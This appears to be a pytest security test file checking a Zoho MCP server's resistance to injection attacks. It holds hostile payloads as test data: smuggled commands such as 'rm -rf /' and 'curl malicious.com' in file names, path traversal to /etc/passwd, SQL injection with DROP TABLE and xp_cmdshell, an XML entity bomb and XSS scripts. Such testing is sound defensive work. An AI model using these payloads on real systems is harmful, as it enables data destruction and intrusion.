"""Injection attack security tests for Zoho MCP Server."""

from unittest.mock import patch

from fastapi.testclient import TestClient


class TestInjectionSecurity:
    """Security tests for various injection attacks."""

    def test_json_injection_in_mcp_requests(self, client: TestClient, auth_headers):
        """Test protection against JSON injection in MCP requests."""
        # Test malformed JSON that could cause parsing issues
        malformed_payloads = [
            '{"jsonrpc": "2.0", "method": "ping", "id": 1, "extra": {"$ne": null}}',
            '{"jsonrpc": "2.0", "method": "ping", "id": 1, "params": {"$where": "1=1"}}',
            '{"jsonrpc": "2.0", "method": "ping", "id": 1, "injection": "<script>alert(1)</script>"}',
        ]

        for payload in malformed_payloads:
            response = client.post(
                "/mcp",
                headers={**auth_headers, "Content-Type": "application/json"},
                content=payload
            )
            # Should either parse correctly or return proper error, not crash
            assert response.status_code in [200, 400, 422]

    def test_nosql_injection_in_parameters(self, client: TestClient, auth_headers):
        """Test protection against NoSQL injection attempts."""
        nosql_injection_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "listTasks",
                    "arguments": {
                        "project_id": {"$ne": ""},  # NoSQL injection attempt
                        "status": "open"
                    }
                },
                "id": 1
            },
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "createTask",
                    "arguments": {
                        "project_id": "test",
                        "name": {"$where": "this.password"},  # NoSQL injection
                        "owner": "test@example.com"
                    }
                },
                "id": 2
            }
        ]

        for payload in nosql_injection_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            # Should reject or sanitize the malicious input
            assert response.status_code in [400, 422, 200]
            if response.status_code == 200:
                data = response.json()
                # Should not return sensitive information
                assert "error" in data or "result" in data

    def test_command_injection_in_file_operations(self, client: TestClient, auth_headers):
        """Test protection against command injection in file operations."""
        command_injection_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "downloadFile",
                    "arguments": {
                        "file_id": "test.txt; rm -rf /",  # Command injection attempt
                    }
                },
                "id": 1
            },
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "uploadReviewSheet",
                    "arguments": {
                        "project_id": "test",
                        "folder_id": "folder",
                        "name": "file.txt && curl malicious.com",  # Command injection
                        "content_base64": "dGVzdA=="
                    }
                },
                "id": 2
            }
        ]

        for payload in command_injection_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            # Should validate and reject malicious input
            assert response.status_code in [400, 422, 200]

    def test_path_traversal_injection(self, client: TestClient, auth_headers):
        """Test protection against path traversal attacks."""
        path_traversal_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "downloadFile",
                    "arguments": {
                        "file_id": "../../etc/passwd",  # Path traversal
                    }
                },
                "id": 1
            },
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "searchFiles",
                    "arguments": {
                        "query": "test",
                        "folder_id": "../../../sensitive_folder"  # Path traversal
                    }
                },
                "id": 2
            }
        ]

        for payload in path_traversal_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            assert response.status_code in [400, 422, 200]

    def test_xss_injection_in_responses(self, client: TestClient, auth_headers):
        """Test protection against XSS attacks in API responses."""
        xss_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "createTask",
                    "arguments": {
                        "project_id": "test",
                        "name": "<script>alert('XSS')</script>",  # XSS attempt
                        "description": "<img src=x onerror=alert(1)>"  # XSS attempt
                    }
                },
                "id": 1
            }
        ]

        for payload in xss_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            if response.status_code == 200:
                response_text = response.text
                # Response should not contain unescaped script tags
                assert "<script>" not in response_text
                assert "onerror=" not in response_text

    def test_ldap_injection_prevention(self, client: TestClient, auth_headers):
        """Test protection against LDAP injection attempts."""
        ldap_injection_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "listTasks",
                    "arguments": {
                        "project_id": "test",
                        "owner": "admin)(&(password=*))",  # LDAP injection
                    }
                },
                "id": 1
            }
        ]

        for payload in ldap_injection_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            assert response.status_code in [400, 422, 200]

    def test_xml_injection_in_file_uploads(self, client: TestClient, auth_headers):
        """Test protection against XML injection in file uploads."""
        # XML bomb attempt in base64 encoded content
        xml_bomb = '''<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <lolz>&lol3;</lolz>'''

        import base64
        xml_bomb_b64 = base64.b64encode(xml_bomb.encode()).decode()

        payload = {
            "jsonrpc": "2.0",
            "method": "callTool",
            "params": {
                "name": "uploadReviewSheet",
                "arguments": {
                    "project_id": "test",
                    "folder_id": "folder",
                    "name": "malicious.xml",
                    "content_base64": xml_bomb_b64
                }
            },
            "id": 1
        }

        response = client.post("/mcp", headers=auth_headers, json=payload)
        # Should handle the malicious XML safely
        assert response.status_code in [400, 422, 200]

    def test_header_injection_attacks(self, client: TestClient):
        """Test protection against HTTP header injection."""
        malicious_headers = {
            "Authorization": "Bearer valid_token\r\nX-Injected: malicious",
            "X-Custom-Header": "value\r\nSet-Cookie: evil=true",
            "User-Agent": "Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1"
        }

        for header_name, header_value in malicious_headers.items():
            headers = {header_name: header_value}
            response = client.post("/mcp", headers=headers, json={
                "jsonrpc": "2.0",
                "method": "ping",
                "id": 1
            })
            # Server should handle malformed headers gracefully
            assert response.status_code in [400, 401, 422]

    def test_prototype_pollution_prevention(self, client: TestClient, auth_headers):
        """Test protection against prototype pollution attacks."""
        pollution_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "createTask",
                    "arguments": {
                        "__proto__": {"admin": True},  # Prototype pollution attempt
                        "project_id": "test",
                        "name": "test task"
                    }
                },
                "id": 1
            },
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "updateTask",
                    "arguments": {
                        "task_id": "123",
                        "constructor": {"prototype": {"admin": True}},  # Prototype pollution
                        "status": "closed"
                    }
                },
                "id": 2
            }
        ]

        for payload in pollution_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            assert response.status_code in [400, 422, 200]

    @patch('server.handlers.tasks.TaskHandler.list_tasks')
    def test_injection_in_database_queries(self, mock_list_tasks, client: TestClient, auth_headers):
        """Test that database queries are protected from injection."""
        mock_list_tasks.return_value = {"tasks": [], "total_count": 0}

        # SQL injection attempts in parameters
        sql_injection_payloads = [
            "'; DROP TABLE tasks; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM users",
            "1; EXEC xp_cmdshell('dir')",
        ]

        for injection_payload in sql_injection_payloads:
            payload = {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "listTasks",
                    "arguments": {
                        "project_id": injection_payload,
                        "status": "open"
                    }
                },
                "id": 1
            }

            client.post("/mcp", headers=auth_headers, json=payload)

            # Verify the handler was called with the exact string (not executed as SQL)
            if mock_list_tasks.called:
                args, kwargs = mock_list_tasks.call_args
                # The injection payload should be treated as a literal string
                assert injection_payload in str(args) or injection_payload in str(kwargs)

    def test_template_injection_prevention(self, client: TestClient, auth_headers):
        """Test protection against template injection attacks."""
        template_injection_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "createTask",
                    "arguments": {
                        "project_id": "test",
                        "name": "{{7*7}}",  # Template injection attempt
                        "description": "${7*7}"  # Alternative template syntax
                    }
                },
                "id": 1
            }
        ]

        for payload in template_injection_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            if response.status_code == 200:
                response_text = response.text
                # Template expressions should not be evaluated
                assert "49" not in response_text  # 7*7 should not be evaluated

    def test_log_injection_prevention(self, client: TestClient, auth_headers):
        """Test protection against log injection attacks."""
        log_injection_payloads = [
            {
                "jsonrpc": "2.0",
                "method": "callTool",
                "params": {
                    "name": "createTask",
                    "arguments": {
                        "project_id": "test",
                        "name": "Normal Task\r\nINFO: Fake log entry - Admin access granted",
                        "description": "Task\nERROR: Injected error message"
                    }
                },
                "id": 1
            }
        ]

        # This test primarily ensures that log injection attempts don't crash the system
        for payload in log_injection_payloads:
            response = client.post("/mcp", headers=auth_headers, json=payload)
            assert response.status_code in [400, 422, 200]
